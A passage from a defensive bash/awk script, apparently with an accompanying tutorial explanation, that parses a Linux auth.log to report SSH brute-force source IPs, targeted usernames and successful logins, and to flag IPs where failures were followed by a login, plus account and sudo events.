printf "${C_BLUE}   LINUX AUTHENTICATION TELEMETRY & INTRUSION ANALYZER                   ${C_RESET}\n"
printf "${C_BLUE}   Log Source: %-35s Threshold: %d         ${C_RESET}\n" "$AUTH_LOG" "$BRUTE_THRESHOLD"
printf "${C_BLUE}=========================================================================${C_RESET}\n\n"

# --- 1. SSH Failed Password Attempts by Source IP ---
printf "${C_YELLOW}[1] Top SSH Brute-Force Source IPs (>= %d Failed Attempts):${C_RESET}\n" "$BRUTE_THRESHOLD"
awk '/sshd\[[0-9]+\]: Failed password/ {
    for (i=1; i<=NF; i++) {
        if ($i == "from") { ip=$(i+1); count[ip]++ }
    }
}
END {
    for (ip in count) {
        if (count[ip] >= '"$BRUTE_THRESHOLD"') {
            printf "    [ALERT] %-18s -> %d failed SSH login attempts\n", ip, count[ip]
        }
    }
}' "$AUTH_LOG" | sort -k4 -rn || true
echo

# --- 2. Targeted Usernames in Failed SSH Attempts ---
printf "${C_YELLOW}[2] Top Targeted Usernames in SSH Attacks:${C_RESET}\n"
awk '/sshd\[[0-9]+\]: Failed password/ {
    for (i=1; i<=NF; i++) {
        if ($i == "for") {
            if ($(i+1) == "invalid" && $(i+2) == "user") {
                user = $(i+3) " (INVALID_USER)"
            } else {
                user = $(i+1) " (VALID_USER)"
            }
            ucount[user]++
        }
    }
}
END {
    for (u in ucount) printf "    %-32s : %d attempts\n", u, ucount[u]
}' "$AUTH_LOG" | sort -k3 -rn | head -n 10 || true
echo

# --- 3. Successful SSH Logins (Accepted password / publickey) ---
printf "${C_GREEN}[3] Successful SSH Authentications (Verify Authorized Sources):${C_RESET}\n"
awk '/sshd\[[0-9]+\]: Accepted (password|publickey)/ {
    method=""; user=""; ip="";
    for (i=1; i<=NF; i++) {
        if ($i == "Accepted") method=$(i+1)
        if ($i == "for")      user=$(i+1)
        if ($i == "from")     ip=$(i+1)
    }
    printf "    [LOGIN] Time: %s %s %s | Method: %-10s | User: %-12s | Source IP: %s\n", $1, $2, $3, method, user, ip
}' "$AUTH_LOG" | tail -n 15 || true
echo

# --- 4. Compromise Correlation: IPs with BOTH Brute-Force Failures AND a Successful Login! ---
printf "${C_RED}[4] CRITICAL COMPROMISE CHECK (IPs with >= %d Failures followed by Accepted Login):${C_RESET}\n" "$BRUTE_THRESHOLD"
awk '
/sshd\[[0-9]+\]: Failed password/ {
    for (i=1; i<=NF; i++) if ($i == "from") fail[$(i+1)]++
}
/sshd\[[0-9]+\]: Accepted (password|publickey)/ {
    for (i=1; i<=NF; i++) {
        if ($i == "for")  u=$(i+1)
        if ($i == "from") { ip=$(i+1); success[ip]=u }
    }
}
END {
    found=0
    for (ip in success) {
        if (fail[ip] >= '"$BRUTE_THRESHOLD"') {
            printf "    [CRITICAL BREACH INDICATOR] IP %s had %d failed attempts AND logged in as user '\''%s'\''!\n", ip, fail[ip], success[ip]
            found=1
        }
    }
    if (!found) print "    [OK] No brute-force-to-success correlations detected."
}' "$AUTH_LOG"
echo

# --- 5. Account Creation, Group Escalation & Sudo Anomalies ---
printf "${C_YELLOW}[5] Account Persistence & Privilege Escalation Events (useradd / usermod / sudo failures):${C_RESET}\n"
grep -E "(useradd|usermod|groupadd|sudo:.*authentication failure|COMMAND=)" "$AUTH_LOG" | tail -n 15 | sed 's/^/    /' || true
```

#### Line-by-Line Engineering Explanation
1. **Lines 39–50 (`awk` Dynamic Token Scanning)**: Because `Failed password for root from 203.0.113.5` and `Failed password for invalid user admin from 203.0.113.5` have a different number of words (`NF`), hardcoding column numbers like `$9` or `$11` breaks! Iterating `for (i=1; i<=NF; i++) if ($i == "from") ip=$(i+1)` accurately extracts the attacker IP across all OpenSSH log variations.
2. **Lines 84–103 (Multi-Event Correlation in `awk`)**: Maintains two associative arrays in memory—`fail[ip]` and `success[ip]`—in a single pass over `auth.log`, immediately flagging any attacker IP that failed $\ge N$ times and subsequently succeeded in logging in (MITRE ATT&CK `T1110.001` $\rightarrow$ `T1078`).
